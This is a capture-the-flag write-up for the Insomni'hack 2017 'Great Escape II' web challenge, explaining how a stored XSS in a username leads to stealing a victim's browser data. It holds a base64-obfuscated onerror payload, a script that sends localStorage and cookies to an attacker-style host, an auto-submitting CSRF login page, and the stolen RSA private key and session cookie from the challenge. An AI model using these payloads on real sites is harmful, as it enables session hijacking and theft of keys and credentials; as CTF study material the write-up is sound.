# Insomni'hack teaser - The Great Escape II (web 200)
We didn't solve this challenge but we were working on it for quite some time. This writeup is based on https://jiulongw.github.io/post/insomnihack-2017-the-great-escape/#part-ii-web-200-pts, what we should have done.

## What we did correct
We found the link https://ssc.teaser.insomnihack.ch/ from the .pcap file during The Great Escape 1. We also had the username and password for the rogue account (rogue:rogue) which we could sign in to. If we visit https://ssc.teaser.insomnihack.ch/files we could see a list of uploaded files. We also had the ability to upload files.
 
By visiting [https://ssc.teaser.insomnihack.ch/sscApp.js](sscApp.js) we could determine that a RSA keypair was generated and saved to local storage as a JSON Web Key (Jwk). When you upload a file:

- A random AES key and iv are generated
- The file is encrypted with the AES key
- The AES key is encrypted with the public RSA key from local storage.

## What we missed
From the .pcap file we found the following email
```
From: rogue@ssc.teaser.insomnihack.ch
To: gr27@ssc.teaser.insomnihack.ch
Date: Fri, 20 Jan 2017 11:51:27 +0000
Subject: The Great Escape
 
I’m currently planning my escape from this confined environment. I plan on using our Swiss Secure Cloud (https://ssc.teaser.insomnihack.ch) to transfer my code offsite and then take over the server at tge.teaser.insomnihack.ch to install my consciousness and have a real base of operations.
 
I’ll be checking this mail box every now and then if you have any information for me. I’m always interested in learning, so if you have any good links, please send them over.
```

We did not give this email much thought but according to the last sentence, rouge will check his inbox for any good links, which means that there is most likely a script running checking the mailbox and opening any new links.
 
There were not any obvious XSS attacks in main interface, we tried uploading files with JS/HTML code but got nothing. However if you registered an account with the name <a href="google.se">google.se</a> and viewed https://ssc.teaser.insomnihack.ch/api/user.php?action=getUser you can see that the HTML code gets executed. This fact can also be derived from the .pcap file, when the user sends a GET request to /api/user.php?action=getUser the response is a json object but has "content-type: text/html".

## What we did wrong
We initially thought we could use the private key from The Great Escape 1, convert it to JWK and try to download one of the files previously uploaded named ssc.key and ssc.pem. We spent many hours researching how to convert a RSA key to JWK format and building a script that tried decrypt the encrypted AES key with our private key. Turns out this was the wrong path to take...
 
We eventually came to the conclusion that we need to steal Rogue's keys somehow, which meant there had to be an XSS vulnerability somewhere.

## What we should have done
We should sent an email to rouge@ssc.teaser.insomnihack.ch with a link which we could track if someone clicked it, for example with https://requestb.in/.
 
Create an account with a username that executes javascript code. When rogue signs in a request will be sent to /api/user.php?action=getUser which returns the current user, this will cause our javascript code to be executed.
 
Creating an account with `"http://" ` or `<script></script>` would not work that well because the server escapes / so it becomes `http:\/\/` and `<\/script>`. The solution is to simply create `<script>` tags dynamically with javascript!
 
Consider this username:
 
```
<img src='a' onerror='var p=document.createElement(`script`);p.setAttribute(`src`,atob(`aHR0cHM6Ly94c3MuY2N0Zi5zZS9hbGwuanM=`));document.body.appendChild(p);' />
```
 
1. First we specify an img tag with src "a"
2. The onerror attribute will trigger the javascript code since "a" doesn't exist.
3. The javascript code creates an element, `<script>`, sets the src attribute to the decoded base64 value. The function `atob()` takes an base64 encoded string and returns the decoded version. In this case, the base64 string is actually the URL link to the attacks script: `https://hackerdomain/script.js`
4. The last part of the JS code simply appends the `<script>` element to the `<body>`.
 
The hackers script running at `https://hackerdomain/script.js` contains the following JS code:

```javascript
var i = 0;
var result = "";
for (i = 0; i < localStorage.length; i++) {
  var key = localStorage[localStorage.key(i)];
  result += ":::" + key;
}
result += ":::" + document.cookie;
window.location = "https://hackerdomain.se/steal.php?d=" + btoa(result);
```

Once executed, the above code loops through all the (key, value) pairs the victim has in their local storage and saves it to the result variable. Next it grabs the victim's cookie and appends it to the result variable containing the local storage information. Finally it sends the result to the hacker's PHP script that saves the information to disk. The information is base64 encoded and sent via a GET request in the d parameter.
 
It should be noted that had this been a real attack, `window.location` would have redirected the user to the hacker's domain, which would have been fairly obvious that something  was wrong.
 
You may ask, why not simply send a GET/POST request directly from the script? The answer is that browsers do not permit sending such requests between different domains. There are multiple ways however to circumvent this protection, but that is an article for the future.
 
## Okey, nuff talk more sploiting

Alrighty, let's steal whatever rogue has in his local storage and his cookies. In order to do this, we must send him a page which logs into our account. Once logged in, our XSS username will be executed and run our code from our server.
 
We can construct the folloing HTML page and upload it to https://hackerdomain.se/page.html

```
<html>
<body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<form id="login" method="POST" action="https://ssc.teaser.insomnihack.ch/api/user.php">
<input name="name" value="<img src='a' onerror='var p=document.createElement(`script`);p.setAttribute(`src`,atob(`aHR0cHM6Ly94c3MuY2N0Zi5zZS9hbGwuanM=`));document.body.appendChild(p);' />" type="text"/>
<input name="password" value="<img src='a' onerror='var p=document.createElement(`script`);p.setAttribute(`src`,atob(`aHR0cHM6Ly94c3MuY2N0Zi5zZS9hbGwuanM=`));document.body.appendChild(p);' />" type="text"/>
    <input name="action" value="login" type="text"/>
   </form>
 
  <script language="javascript">
  setTimeout(function() {
    $('#login').submit();
    }, 1000);
  </script>
 
</body>
</html>
```

Now, all we need to do is to send the URL to rouge@ssc.teaser.insomnihack.ch and hope he clicks the link! Rogue did click the link, and this was the following response:

```
:::INS{IhideMyVulnsWithCrypto}:::{"alg":"RSA-OAEP-256","d":"CFSPW_AU_cK07bOtdnzbj5MgBqdweDY04Ku-mHSrAIbDv3J_lHH-jCPQb5U2JR4v08eMXlz3AassULQr60rskdwjdPN7Nen15yRcRTsaoSyRTd2qM8O_U-K6Gy7Lvg_ld2HOlHNBBy2k8g8cP7cpjyy7Ebsk5MUNy_udx9aMs7497RaIrCFnpT7RztudkYBo_2Oy5xm6BcsV9059HBhbKbUqq6Ui9_BZ3H7sdwTqlYx3afVV5AgE61eEdWK7vK_yI65Ru_5_fOBWik7xf7fwPjf7COp1HfTZiFbCIWTUaXVe6ThfMoTdwT1wQ0wwuFdtpGTkk8d4XwGtDa8-_XbmIQ","dp":"hapJ7dlVsPvF9no_s-Nfnpv2dZ5a5_C2AyPo_-_mVi4-1a7HTkW9SyGg1KextCPYRAwQZ1wU3bL6P_4TjkrYiAAl-8Iq6moUqWuRY7G8vo3N_P3aBwjgyNTzk3eHfnUFP4QgGOooT2ZwyuDTDSbwKOesnD13q4U_vjtjcZaFU70","dq":"Ts_hwWPsLOjp-yJg0wbQEONeqbvNPLCChb5QJItXvUaL2JcN9muozrN1GZqu383-h8gZ-VUm3-CFU7OWeGYLa0PZlq1uGNvsdffgdNL3MYZ2KwMhXkwXKf45ePhx_ydiblYhb44cFtm0ffXKSPlvbyzLHvJ2_o8ggok0Lzu-weE","e":"AQAB","ext":true,"key_ops":["decrypt"],"kty":"RSA","n":"qx_U0OgHUPC6n4RcE_q1ONcEgKp4tcbLWeUIfrlRAcX64alQSpddAv98CHo2ziSBgi7tS-HwUsVlH06Nxaa0tx3SdM0cz95IkvjB_kqdPnHEwyx8iz5Gh8ZHP32ZoETBs2PzxTIcEOekm1qQnA0MTdvAAO0xcvuvhRM2YycRYfN860NsBCRrF25lZn9DTGBDnisCm0-xvElxAZ8gObWeJ1SZRgFRJwI14d11oa922drFp0ux4MHscls2tEjPV7eXdivjGYI-uzVX61fjyUdGxFeb8CAjxrzOmw4f1Aac7kqXwmF-eMq3AMKm2tArrIIjT4t2q2mP1FXImrNQ_vinVQ","p":"29_YD0m-NFoUTmst33E4p2VBDlCeQ1MJdr_7tO4ERF8aww0e8hu3jRq5PMHCEc8G8gA4q2kuXylIpaB5mWzcQplDDMgIDGupEnL_J0ynMcg-HUld8NDaya7mQWtLHvSEAoB-2MymBTJYaTwsvAYtTI8ruaqhMo4-cKjs5zQfmj0","q":"xz2B2WzMdesiDK7dzorVdJlBgIShj2cMRGwhXcSiWfbY2M4Y3DB_m8p5tdEUIU6g0oWbSfmaYF_MsQxijXRxxe17nuYssns2ue4hYm2xH4mTY6voeNhbOeu7LtOXepUWxN-5520suTvL74Lx9xwWrdeTGIF1_zECqbWRuFieSvk","qi":"VhY5UYLTv20Btpq4MlizFPSuuItbfmK61P0rqEXe-sYHTitMNDBOWDSwIqj4pHkDTFaOCG0o6z81MyVg_bmz2ODzkHDrJUeiOVSMISxlaeSRf2JhiVYMfXiWKJBGCP-PgWuHp5NwLwESZT3aZ0KBYSkE7jnfcttWbc0mYu1glWg"}:::{"alg":"RSA-OAEP-256","e":"AQAB","ext":true,"key_ops":["encrypt"],"kty":"RSA","n":"qx_U0OgHUPC6n4RcE_q1ONcEgKp4tcbLWeUIfrlRAcX64alQSpddAv98CHo2ziSBgi7tS-HwUsVlH06Nxaa0tx3SdM0cz95IkvjB_kqdPnHEwyx8iz5Gh8ZHP32ZoETBs2PzxTIcEOekm1qQnA0MTdvAAO0xcvuvhRM2YycRYfN860NsBCRrF25lZn9DTGBDnisCm0-xvElxAZ8gObWeJ1SZRgFRJwI14d11oa922drFp0ux4MHscls2tEjPV7eXdivjGYI-uzVX61fjyUdGxFeb8CAjxrzOmw4f1Aac7kqXwmF-eMq3AMKm2tArrIIjT4t2q2mP1FXImrNQ_vinVQ"}:::PHPSESSID=hiapgndb97prpbi0bu3d9pj142
```

As you can see, the flag is the first item, stored in rogue's local storage.

## What we have learned
- Pay attention to emails and any "role playing" information.
- If there are APIs present, make sure you check all their endpoints and what their response is.

